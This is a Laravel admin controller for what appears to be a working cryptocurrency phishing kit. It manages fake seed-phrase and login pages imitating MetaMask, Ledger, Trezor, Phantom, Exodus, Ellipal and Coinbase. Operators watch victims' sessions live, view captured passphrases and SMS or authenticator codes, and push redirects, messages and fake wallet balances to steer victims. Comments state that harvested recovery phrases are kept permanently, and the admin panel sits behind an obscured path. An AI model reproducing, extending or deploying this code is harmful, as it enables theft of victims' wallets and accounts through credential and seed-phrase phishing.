<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class AdminController extends Controller
{
    public function loginForm()
    {
        if (session('admin_auth')) {
            return redirect()->route('admin.dashboard');
        }
        return view('admin.login');
    }

    public function login(Request $request)
    {
        $request->validate(['password' => 'required']);

        // Check if this IP is currently banned
        $ip = $request->ip();
        DB::table('admin_ip_bans')->where('expires_at', '<', now())->delete();
        $ban = DB::table('admin_ip_bans')->where('ip_address', $ip)->where('expires_at', '>=', now())->first();
        if ($ban) {
            $remaining = (int) ceil((strtotime($ban->expires_at) - time()) / 60);
            return back()->withErrors(['password' => "Your IP is banned. Try again in {$remaining} minute(s)."]);
        }

        $stored   = config('liveled.admin_password');
        $input    = $request->password;
        $isBcrypt = strlen($stored) === 60 && str_starts_with($stored, '$2y$');
        // Log warning if password is not hashed (security issue)
        if (!$isBcrypt) {
            \Illuminate\Support\Facades\Log::warning('Admin password not bcrypt-hashed. Set a proper hash in config.');
        }
        $valid    = $isBcrypt
            ? \Illuminate\Support\Facades\Hash::check($input, $stored)
            : ($input === $stored);

        if ($valid) {
            session(['admin_auth' => true, 'admin_role' => 'master']);
            return redirect()->route('admin.dashboard');
        }

        // Sub-admins now use URL keys — password login is master-only

        return back()->withErrors(['password' => 'Wrong password.']);
    }

    public function logout()
    {
        // Remove master admin heartbeat row on explicit logout
        if (session('admin_role') === 'master') {
            DB::table('admin_online_sessions')->where('session_id', session()->getId())->delete();
        }
        session()->flush();
        return redirect()->route('admin.login');
    }

    public function dashboard()
    {
        $adminRole      = session('admin_role') ?? 'master';
        $subAdminLabel  = session('sub_admin_label', '');
        return view('admin.dashboard', compact('adminRole', 'subAdminLabel'));
    }

    public function sessionList()
    {
        $sessions = \App\Models\UserSession::withCount('events')
            ->orderByDesc('pinned')
            ->orderByDesc('created_at')
            ->take(100)
            ->get();

        // Get the timestamp of the most recent user_event per session.
        // user_events are created ONLY by real user interactions (page visits, typing,
        // form submits) — never by heartbeat or command polling — so this is an accurate
        // "last time the user actually did something" signal.
        $tokens = $sessions->pluck('session_token')->toArray();
        $lastResponse = \App\Models\UserEvent::whereIn('session_token', $tokens)
            ->select('session_token', DB::raw('MAX(created_at) as last_event_at'))
            ->groupBy('session_token')
            ->pluck('last_event_at', 'session_token');

        $sessions = $sessions->map(fn ($s) => array_merge($s->toArray(), [
            'is_active'     => $s->isActive(),
            'event_count'   => $s->events_count,
            'last_response' => $lastResponse[$s->session_token] ?? null,
        ]));

        return view('admin.partials.session-list', compact('sessions'));
    }

    public function sessionEvents(Request $request, string $token)
    {
        $session = \App\Models\UserSession::where('session_token', $token)->firstOrFail();
        $canSeePassphrases = (session('admin_role') ?? 'master') === 'master';

        $rev = $this->activityFeedRevision($session, $token, $canSeePassphrases);
        $clientRev = (string) $request->header('X-Activity-Rev', '');
        if ($clientRev !== '' && hash_equals($rev, $clientRev)) {
            return response('', 204);
        }

        $events = \App\Models\UserEvent::where('session_token', $token)
            ->orderByDesc('id')
            ->take(150)
            ->get();

        return response()
            ->view('admin.partials.event-feed', compact('session', 'events', 'canSeePassphrases'))
            ->header('X-Activity-Rev', $rev);
    }

    /**
     * Cheap Activity stamp: event window + summary + presence/warn booleans.
     * Does not include raw last_seen_at (heartbeats would defeat 204).
     */
    private function activityFeedRevision(\App\Models\UserSession $session, string $token, bool $canSeePassphrases): string
    {
        $agg = DB::table('user_events')
            ->where('session_token', $token)
            ->selectRaw('COUNT(*) as event_count, MAX(id) as max_id')
            ->first();

        $eventCount = (int) ($agg->event_count ?? 0);
        $maxId = (int) ($agg->max_id ?? 0);

        $lastEventAt = null;
        if ($maxId > 0) {
            $rawLast = DB::table('user_events')->where('id', $maxId)->value('created_at');
            if ($rawLast) {
                $lastEventAt = \Carbon\Carbon::parse($rawLast);
            }
        }

        $sessionAge = $session->created_at ? now()->diffInSeconds($session->created_at) : 999;
        $noDataWarn = $session->isActive() && $sessionAge > 12 && (!$lastEventAt || now()->diffInSeconds($lastEventAt) > 20);
        $staleWarn = !$session->isActive() && $sessionAge < 30 && $eventCount === 0;

        $rawSummary = (string) ($session->getRawOriginal('activity_summary') ?? '');

        return sha1(implode("\n", [
            'v1',
            $token,
            (string) $maxId,
            (string) $eventCount,
            $session->isActive() ? '1' : '0',
            $noDataWarn ? '1' : '0',
            $staleWarn ? '1' : '0',
            $canSeePassphrases ? '1' : '0',
            $rawSummary,
        ]));
    }

    public function deleteEvents(Request $request)
    {
        $request->validate(['ids' => 'required|array', 'ids.*' => 'integer']);
        \App\Models\UserEvent::whereIn('id', $request->ids)->delete();
        return response()->json(['ok' => true, 'deleted' => count($request->ids)]);
    }

    public function deleteSession(string $token)
    {
        \Illuminate\Support\Facades\DB::transaction(function () use ($token) {
            // Clear stale commands then redirect the user to the configured exit URL.
            // Session/events are wiped; captured_phrases persist permanently.
            // Cookie stays intact so the user can return and start fresh if they want.
            \App\Models\AdminCommand::where('session_token', $token)->delete();
            $savedUrl = \App\Services\LiveledSettings::get()['session_exit_url'] ?? '';
            $exitUrl  = ($savedUrl !== '') ? $savedUrl : '/offline';
            \App\Models\AdminCommand::create([
                'session_token' => $token,
                'command'       => 'redirect',
                'payload'       => ['url' => $exitUrl, 'end_session' => true],
                'executed'      => false,
            ]);
            \App\Models\UserEvent::where('session_token', $token)->delete();
            \App\Models\UserSession::where('session_token', $token)->delete();
            // NOTE: \App\Models\CapturedPhrase records are deliberately preserved.
        });

        return response()->json(['ok' => true]);
    }

    public function renameSession(Request $request, string $token)
    {
        $request->validate(['label' => 'required|string|min:1|max:40']);
        \App\Models\UserSession::where('session_token', $token)
            ->update(['label' => trim($request->label)]);
        return response()->json(['ok' => true]);
    }

    public function togglePinSession(string $token)
    {
        $session = \App\Models\UserSession::where('session_token', $token)->firstOrFail();
        $session->pinned = !$session->pinned;
        $session->save();
        return response()->json(['ok' => true, 'pinned' => $session->pinned]);
    }

    public function getFlowSettings()
    {
        try {
            $settings = \App\Services\LiveledSettings::get();
            $exitUrl  = $settings['session_exit_url'] ?? '';
            \Illuminate\Support\Facades\Log::debug('[getFlowSettings] session_exit_url from DB: ' . var_export($exitUrl, true));
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error('[getFlowSettings] Failed to load settings: ' . $e->getMessage());
            $settings = [];
            $exitUrl  = '';
        }

        try {
            $userPages = $this->getUserPageList();
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error('[getFlowSettings] Failed to build user page list: ' . $e->getMessage());
            $userPages = [];
        }

        return response()->json([
            'site_online'              => $settings['site_online']              ?? true,
            'pow_enabled'              => $settings['pow_enabled']              ?? true,
            'session_exit_url'         => $exitUrl,
            'entry_page'               => \App\Services\LiveledSettings::getEntryPage(),
            'user_pages'               => $userPages,
        ]);
    }

    public function setSessionExitUrl(Request $request)
    {
        try {
            $url = trim((string) $request->input('url', ''));
            \Illuminate\Support\Facades\Log::debug('[setSessionExitUrl] received url: ' . var_export($url, true));

            if ($url !== '') {
                $request->validate([
                    'url' => ['string', 'max:500', 'regex:/^https?:\/\/.+/'],
                ]);
                $url = rtrim($url, '/');
            }

            \App\Services\LiveledSettings::set('session_exit_url', $url);

            // Verify it was actually saved
            $verify = \App\Services\LiveledSettings::get();
            $saved  = $verify['session_exit_url'] ?? 'NOT FOUND';
            \Illuminate\Support\Facades\Log::debug('[setSessionExitUrl] saved, verify read-back: ' . var_export($saved, true));

            return response()->json(['ok' => true, 'saved' => $url]);
        } catch (\Illuminate\Validation\ValidationException $e) {
            $errors = $e->errors();
            \Illuminate\Support\Facades\Log::warning('[setSessionExitUrl] Validation failed: ' . json_encode($errors));
            return response()->json(['ok' => false, 'error' => 'Validation failed: ' . json_encode($errors)], 422);
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error('[setSessionExitUrl] Exception: ' . $e->getMessage());
            return response()->json(['ok' => false, 'error' => $e->getMessage()], 500);
        }
    }

    public function setEntryPage(Request $request)
    {
        $url     = $request->input('url', '');
        $allowed = array_column($this->getUserPageList(), 'url');
        if (!in_array($url, $allowed, true)) {
            return response()->json(['ok' => false, 'error' => 'Invalid page'], 422);
        }
        \App\Services\LiveledSettings::setEntryPage($url);
        return response()->json(['ok' => true]);
    }

    /**
     * Auto-discover all GET routes served by UserController.
     * Labels and groups come from the metadata map; any newly added route
     * without a map entry gets auto-labelled from its URL — zero code changes needed.
     */
    private function getUserPageList(): array
    {
        // Human-readable label + group for every known user route.
        // Add new entries here when you add new routes.
        $meta = [
            '/metamask/import'              => ['Import Wallet',             'MetaMask'],
            '/metamask/recover'             => ['Recover Wallet',            'MetaMask'],
            '/metamask/loading'             => ['Loading',                   'MetaMask'],
            '/exodus/import'                => ['Import Wallet',             'Exodus'],
            '/exodus/recover'               => ['Recover Wallet',            'Exodus'],
            '/exodus/loading'               => ['Loading',                   'Exodus'],
            '/ellipal/1'                    => ['24-Word Phrase',            'Ellipal'],
            '/ellipal/recover'              => ['Recover Wallet',            'Ellipal'],
            '/ellipal/2'                    => ['12-Word Phrase',            'Ellipal'],
            '/ellipal/loading'              => ['Loading',                   'Ellipal'],
            '/trezor/connect'               => ['Connect',                   'Trezor'],
            '/trezor/recover'               => ['Recover Wallet',            'Trezor'],
            '/trust/recover'                => ['Recover Wallet',            'Trust'],
            '/trezor/loading'               => ['Loading',                   'Trezor'],
            '/trezor/phrase-page'           => ['Phrase Page',               'Trezor'],
            '/ledger/1'                     => ['Phrase Page 1',             'Ledger'],
            '/ledger/2'                     => ['Phrase Page 2',             'Ledger'],
            '/ledger/3'                     => ['Phrase Page 3',             'Ledger'],
            '/ledger/1/recover'             => ['Recover Page 1',            'Ledger'],
            '/ledger/2/recover'             => ['Recover Page 2',            'Ledger'],
            '/ledger/3/recover'             => ['Recover Page 3',            'Ledger'],
            '/ledger/signin'                => ['Sign In',                   'Ledger'],
            '/ledger/loading'               => ['Loading',                   'Ledger'],
            '/phantom/seeds'                => ['Import Recovery Phrase',   'Phantom'],
            '/phantom/recover'              => ['Recover Wallet',           'Phantom'],
            '/phantom/loading'              => ['Loading',                  'Phantom'],
        ];

        // Group display order
        $groupOrder = ['MetaMask' => 2, 'Exodus' => 3, 'Ellipal' => 4, 'Ledger' => 5, 'Trezor' => 9, 'Phantom' => 10, 'Coinbase' => 11];

        $pages = [];
        $controllerClass = \App\Http\Controllers\UserController::class;

        foreach (\Illuminate\Support\Facades\Route::getRoutes() as $route) {
            // Only parameterless GET routes
            if (!in_array('GET', $route->methods(), true)) continue;
            if (count($route->parameterNames()) > 0) continue;

            $uri = '/' . ltrim($route->uri(), '/');

            // Skip internal/non-page routes and removed brands
            $skip = ['/offline', '/status', '/exodus'];
            if (array_filter($skip, fn($s) => str_starts_with($uri, $s))) continue;

            // Include if it's a UserController route OR explicitly listed in $meta
            $action = $route->getAction();
            $uses   = $action['uses'] ?? ($action['controller'] ?? '');
            $isUserController = is_string($uses) && str_starts_with($uses, $controllerClass . '@');
            $isInMeta = isset($meta[$uri]);
            if (!$isUserController && !$isInMeta) continue;

            [$label, $group] = $meta[$uri] ?? $this->autoLabel($uri);

            $pages[] = [
                'label' => $label,
                'url'   => $uri,
                'group' => $group,
            ];
        }

        // Sort by group order then label alphabetically
        usort($pages, function (array $a, array $b) use ($groupOrder) {
            $ga = $groupOrder[$a['group']] ?? 99;
            $gb = $groupOrder[$b['group']] ?? 99;
            return $ga !== $gb ? $ga - $gb : strcmp($a['label'], $b['label']);
        });

        return $pages;
    }

    /** Generate a label + group from a URI when it's not in the metadata map. */
    private function autoLabel(string $uri): array
    {
        $parts = array_filter(explode('/', $uri));
        $group = ucfirst(reset($parts) ?: 'Other');
        $slug  = end($parts) ?: 'page';
        $label = ucwords(str_replace(['-', '_'], ' ', $slug));
        return [$label, $group];
    }

    public function setPowStatus(Request $request)
    {
        $request->validate(['enabled' => 'required|boolean']);
        \App\Services\LiveledSettings::set('pow_enabled', $request->boolean('enabled'));
        return response()->json(['ok' => true]);
    }

    public function setSiteStatus(Request $request)
    {
        $request->validate(['online' => 'required|boolean']);
        $online = $request->boolean('online');
        \App\Services\LiveledSettings::set('site_online', $online);

        if (!$online) {
            $tokens = \App\Models\UserSession::where('last_seen_at', '>=', now()->subSeconds(30))
                ->pluck('session_token');
            foreach ($tokens as $token) {
                \App\Models\AdminCommand::create([
                    'session_token' => $token,
                    'command'       => 'redirect',
                    'payload'       => ['url' => '/offline'],
                    'executed'      => false,
                ]);
            }
        }

        return response()->json(['ok' => true]);
    }

    public function issueCommand(Request $request)
    {
        $request->validate([
            'session_token' => 'required|string|max:64|exists:user_sessions,session_token',
            'command'       => 'required|in:redirect,show_message,block,reset,update_vault',
            'payload'       => 'nullable|array',
        ]);

        // Per-command payload validation
        $cmd = $request->command;
        if ($cmd === 'redirect')      $request->validate(['payload.url'     => 'required|string|max:500']);
        if ($cmd === 'show_message')  $request->validate(['payload.message' => 'required|string|max:1000']);
        if ($cmd === 'block')         $request->validate(['payload.message' => 'nullable|string|max:1000']);

        // Idempotency: skip duplicate unexecuted commands within 5s (not applied to redirect,
        // which carries unique POST payloads and must always be delivered)
        $skipDedup = ($cmd === 'redirect');
        if (!$skipDedup) {
            $exists = \App\Models\AdminCommand::where('session_token', $request->session_token)
                ->where('command', $cmd)
                ->where('executed', false)
                ->where('created_at', '>=', now()->subSeconds(5))
                ->exists();
        } else {
            $exists = false;
        }

        $payload = $request->payload ?? [];
        if ($cmd === 'redirect') {
            $redirUrl  = (string) ($payload['url'] ?? '');
            $redirPath = parse_url($redirUrl, PHP_URL_PATH);
            if (!is_string($redirPath) || $redirPath === '') {
                $redirPath = strtok($redirUrl, '?') ?: $redirUrl;
            }
            if ($redirPath === '/coinbase/seed') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_seed';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state'], $payload['post']);
                $payload['url'] = '/coinbase/seed';
            } elseif ($redirPath === '/coinbase/whitelist-coinbase-wallet') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_whitelist_wallet';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/reset-password') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_reset_password';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/sign-in') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_sign_in';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/sms-code') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_sms_code';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/authenticator-code') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_authenticator_code';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/anydesk') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_anydesk';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/device-confirmation') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_device_confirmation';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/coinbase/email-code') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'coinbase_email_code';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/trezor/phrase-page') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'trezor_phrase_page';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/phantom/seeds') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'phantom_seeds';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/exodus/import') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'exodus_import';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/metamask/import') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'metamask_import';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/ellipal/1') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = 'ellipal_24word';
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif ($redirPath === '/ledger/1' || $redirPath === '/ledger/2' || $redirPath === '/ledger/3') {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = [
                    '/ledger/1' => 'ledger_1',
                    '/ledger/2' => 'ledger_2',
                    '/ledger/3' => 'ledger_3',
                ][$redirPath];
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            } elseif (isset([
                '/trezor/recover' => 'trezor_recover',
                '/exodus/recover' => 'exodus_recover',
                '/ellipal/recover' => 'ellipal_recover',
                '/ledger/1/recover' => 'ledger_1_recover',
                '/ledger/2/recover' => 'ledger_2_recover',
                '/ledger/3/recover' => 'ledger_3_recover',
                '/phantom/recover' => 'phantom_recover',
                '/metamask/recover' => 'metamask_recover',
            ][$redirPath])) {
                $formState = (($payload['page_state'] ?? '') === 'invalid') ? 'invalid' : 'default';
                $token     = $request->session_token;
                $pageKey   = [
                    '/trezor/recover' => 'trezor_recover',
                    '/exodus/recover' => 'exodus_recover',
                    '/ellipal/recover' => 'ellipal_recover',
                    '/ledger/1/recover' => 'ledger_1_recover',
                    '/ledger/2/recover' => 'ledger_2_recover',
                    '/ledger/3/recover' => 'ledger_3_recover',
                    '/phantom/recover' => 'phantom_recover',
                    '/metamask/recover' => 'metamask_recover',
                ][$redirPath];
                $n = \App\Models\UserSession::where('session_token', $token)
                    ->whereNull('metadata')
                    ->update(['metadata' => ['form_state' => [$pageKey => $formState]]]);
                if ($n === 0) {
                    $n = \App\Models\UserSession::where('session_token', $token)
                        ->whereNotNull('metadata')
                        ->whereNull('metadata->form_state')
                        ->update(['metadata->form_state' => [$pageKey => $formState]]);
                }
                if ($n === 0) {
                    \App\Models\UserSession::where('session_token', $token)
                        ->update(['metadata->form_state->'.$pageKey => $formState]);
                }
                unset($payload['page_state']);
            }
        }

        if (!$exists) {
            \App\Models\AdminCommand::create([
                'session_token' => $request->session_token,
                'command'       => $cmd,
                'payload'       => $payload,
            ]);
        }

        // Persist vault data to DB (user_sessions.metadata) so page refresh keeps the latest state
        if ($cmd === 'update_vault' && !empty($request->payload)) {
            $payload       = $request->payload;
            $stdKeys       = ['btc','eth','xrp','sol','ltc','doge','bnb','usdt','usdt_trc20','usdc','usdc_base','usdc_sol','usdc_polygon','ada','dot','shib','avax','matic','link','uni','xlm','trx','atom','vet'];
            $coinKeysStr   = $payload['coin_keys'] ?? '';
            $requestedKeys = array_filter(array_map('trim', explode(',', $coinKeysStr)));
            $allKeys       = array_unique(array_merge($stdKeys, $requestedKeys));
            $session       = \App\Models\UserSession::where('session_token', $request->session_token)->first();

            $existing = [];
            if ($session) {
                $meta = $session->metadata ?? [];
                $existing = $meta['vault_data'] ?? [];
            }

            if (isset($payload['coin_keys'])) {
                $existing['coin_keys'] = $payload['coin_keys'];
            }
            if (isset($payload['coin_meta'])) {
                $existing['coin_meta'] = $payload['coin_meta'];
            }
            foreach ($allKeys as $k) {
                if (array_key_exists($k.'_address', $payload)) {
                    $existing[$k.'_address'] = $payload[$k.'_address'];
                }
                if (array_key_exists($k.'_amount', $payload)) {
                    $existing[$k.'_amount'] = $payload[$k.'_amount'];
                }
            }
            if (array_key_exists('balance', $payload)) {
                $existing['balance'] = $payload['balance'];
            }

            if ($session) {
                $meta = $session->metadata ?? [];
                $meta['vault_data'] = $existing;
                $session->metadata = $meta;
                $session->save();
            }
        }

        return response()->json(['ok' => true]);
    }

    // ── Sub-admin management (master only) ────────────────────────────────────

    public function subAdminPage()
    {
        return view('admin.sub-admins');
    }

    public function subAdminListJson()
    {
        $base = url('/admin777888xxx/s');
        $onlineThreshold = now()->subSeconds(90);
        $accounts = \App\Models\SubAdminAccount::orderBy('id')->get()
            ->map(fn($a) => [
                'id'            => $a->id,
                'label'         => $a->label,
                'access_url'    => $base . '/' . $a->access_key,
                'is_active'     => $a->is_active,
                'created_at'    => $a->created_at?->format('Y-m-d H:i'),
                'last_login_at' => $a->last_login_at?->format('Y-m-d H:i') ?? null,
                'is_online'     => $a->last_active_at && $a->last_active_at->gt($onlineThreshold),
            ]);
        return response()->json($accounts);
    }

    public function createSubAdmin(Request $request)
    {
        $request->validate([
            'label' => 'required|string|min:1|max:60',
        ]);

        $key = \Illuminate\Support\Str::random(40);
        $account = \App\Models\SubAdminAccount::create([
            'label'      => trim($request->label),
            'access_key' => $key,
            'is_active'  => true,
        ]);

        return response()->json(['ok' => true, 'id' => $account->id]);
    }

    public function deleteSubAdmin(int $id)
    {
        \App\Models\SubAdminAccount::findOrFail($id)->delete();
        return response()->json(['ok' => true]);
    }

    public function accessViaKey(string $key)
    {
        $account = \App\Models\SubAdminAccount::where('access_key', $key)
            ->where('is_active', true)
            ->first();

        if (!$account) {
            abort(404);
        }

        $account->update(['last_login_at' => now(), 'last_active_at' => now()]);

        session()->flush();
        session([
            'admin_auth'       => true,
            'admin_role'       => 'sub',
            'sub_admin_id'     => $account->id,
            'sub_admin_label'  => $account->label,
        ]);

        return redirect()->route('admin.dashboard');
    }
}
